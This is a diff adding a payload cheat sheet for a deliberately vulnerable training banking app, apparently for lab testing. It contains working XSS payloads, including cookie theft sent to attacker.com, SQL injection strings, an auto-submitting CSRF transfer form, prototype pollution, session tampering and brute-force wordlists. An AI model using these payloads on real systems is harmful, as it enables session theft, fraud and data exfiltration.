@@ -1,0 +1,255 @@
+# VulnBank Test Payloads
+
+This file contains test payloads for various vulnerabilities in VulnBank.
+
+## DOM-Based XSS Payloads
+
+### Basic XSS
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+
+### Event Handler XSS
+<div onmouseover="alert('XSS')">Hover me</div>
+<input onfocus="alert('XSS')" autofocus>
+<select onfocus="alert('XSS')" autofocus>
+<textarea onfocus="alert('XSS')" autofocus>
+<keygen onfocus="alert('XSS')" autofocus>
+
+### Encoded XSS
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
+<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">
+<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
+
+### Advanced XSS
+'"><script>alert(String.fromCharCode(88,83,83))</script>
+"><svg/onload=alert('XSS')>
+<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
+<img src=x onerror="this.src='http://attacker.com?c='+document.cookie">
+
+### URL-Based XSS
+http://localhost:8000/?message=<img src=x onerror=alert('XSS')>
+http://localhost:8000/#<script>alert('XSS')</script>
+http://localhost:8000/?user=<svg onload=alert('XSS')>
+http://localhost:8000/?debug=alert(document.cookie)
+
+### postMessage XSS
+<script>
+window.postMessage({
+  action: 'showMessage',
+  message: '<img src=x onerror=alert("XSS")>'
+}, '*');
+</script>
+
+<script>
+window.postMessage({
+  action: 'executeCode',
+  code: 'alert("XSS via postMessage")'
+}, '*');
+</script>
+
+## Form Input Payloads
+
+### Login Form
+Username: admin' OR '1'='1
+Password: ' OR '1'='1' --
+
+Username: <script>alert('XSS')</script>
+Password: <img src=x onerror=alert('XSS')>
+
+### Transfer Form
+Recipient: <script>alert('XSS')</script>
+Amount: 100
+Note: <img src=x onerror=alert('XSS in note')>
+
+### Profile Update
+Display Name: <svg onload=alert('XSS')>
+Email: test@example.com<script>alert('XSS')</script>
+
+### Support Chat
+Message: <img src=x onerror=alert('XSS in chat')>
+Message: <iframe src="javascript:alert('XSS')">
+Message: <body onload=alert('XSS')>
+
+## SQL Injection Payloads (for searchTransactions)
+
+### Basic SQL Injection
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin'--
+admin' #
+
+### Union-Based
+' UNION SELECT NULL--
+' UNION SELECT username, password FROM users--
+' UNION SELECT table_name FROM information_schema.tables--
+
+### Time-Based Blind
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+
+### Error-Based
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+
+## JavaScript Console Commands
+
+### Access Debug Functions
+debugAuth.showAllUsers()
+debugAuth.showAllPasswords()
+debugAuth.bypassAuth()
+
+### Access Admin Functions
+adminFunctions.getAllUsers()
+adminFunctions.deleteUser(123)
+adminFunctions.executeQuery("SELECT * FROM users")
+
+### View Stored Secrets
+console.log(APP_CONFIG)
+console.log(localStorage)
+console.log(document.cookie)
+
+### Manipulate Session
+localStorage.setItem('isAdmin', 'true')
+localStorage.setItem('authToken', 'fake_token')
+document.cookie = 'session=admin_session'
+
+### Extract Sensitive Data
+console.log(window.bankingAPI.apiToken)
+console.log(window.bankingAPI.getInternalEndpoints())
+console.log(window.authManager.backupCredentials)
+
+## Browser DevTools Network Tab
+
+### Look for Exposed Secrets in:
+- config.js (AWS keys, JWT secrets, admin passwords)
+- api.js (API tokens, internal endpoints)
+- auth.js (backup credentials, user enumeration)
+- analytics.js (tracking IDs, API keys)
+
+### Check Response Headers for:
+- Missing security headers (CSP, X-Frame-Options)
+- Exposed server information
+- CORS misconfigurations
+
+## Burp Suite Intruder Payloads
+
+### Username Enumeration
+admin
+user
+test
+john
+sarah
+alice
+bob
+administrator
+root
+
+### Password Brute Force
+admin123
+password
+123456
+password123
+admin
+test123
+qwerty
+letmein
+
+## API Endpoint Testing
+
+### Internal Endpoints (from api.js)
+GET https://internal-api.vulnbank.com/admin/users
+GET https://internal-api.vulnbank.com/db/query
+GET https://internal-api.vulnbank.com/backup/download
+GET https://internal-api.vulnbank.com/logs/view
+POST https://internal-api.vulnbank.com/config/update
+
+### Debug Endpoint
+GET https://api.vulnbank.com/debug?token=<exposed_token>
+
+## CSRF Payloads
+
+### Transfer Money CSRF
+<html>
+<body>
+<form action="https://vulnbank.com/api/transfer" method="POST">
+  <input type="hidden" name="recipient" value="attacker">
+  <input type="hidden" name="amount" value="10000">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
+## Prototype Pollution
+
+### Via URL Parameters
+?__proto__[isAdmin]=true
+?constructor[prototype][isAdmin]=true
+
+### Via JSON
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+
+## Local Storage Manipulation
+
+### Via Console
+localStorage.setItem('isAdmin', 'true')
+localStorage.setItem('balance', '999999')
+localStorage.setItem('authToken', 'admin_token')
+
+## Cookie Manipulation
+
+### Via Console
+document.cookie = "session=admin_session; path=/"
+document.cookie = "isAdmin=true; path=/"
+
+## File Paths to Check
+
+### Sensitive Files
+/js/config.js (hardcoded secrets)
+/js/api.js (API tokens)
+/js/auth.js (credentials)
+/.htaccess (configuration)
+/robots.txt (hidden paths)
+/backup/ (backup files)
+/.git/ (source code)
+
+## Fingerprinting
+
+### Check in Console
+window.analytics.collectFingerprint()
+
+### Reveals
+- Browser details
+- Screen resolution
+- Installed plugins
+- Canvas fingerprint
+- WebGL fingerprint
+- Timezone
+- Battery status
+
+## Notes for Testing
+
+1. All payloads should be tested through Burp Suite proxy
+2. VISTA should detect most of these vulnerabilities automatically
+3. Some payloads require interaction (clicking, hovering)
+4. Check browser console for logged sensitive data
+5. Monitor network tab for exposed secrets
+6. Test with different browsers for compatibility
+
+## Responsible Testing
+
+⚠️ Only use these payloads on:
+- Your own VulnBank deployment
+- Systems you have permission to test
+- Isolated testing environments
+
+Never use on:
+- Production systems
+- Systems without authorization
+- Real banking applications
+- Other people's deployments
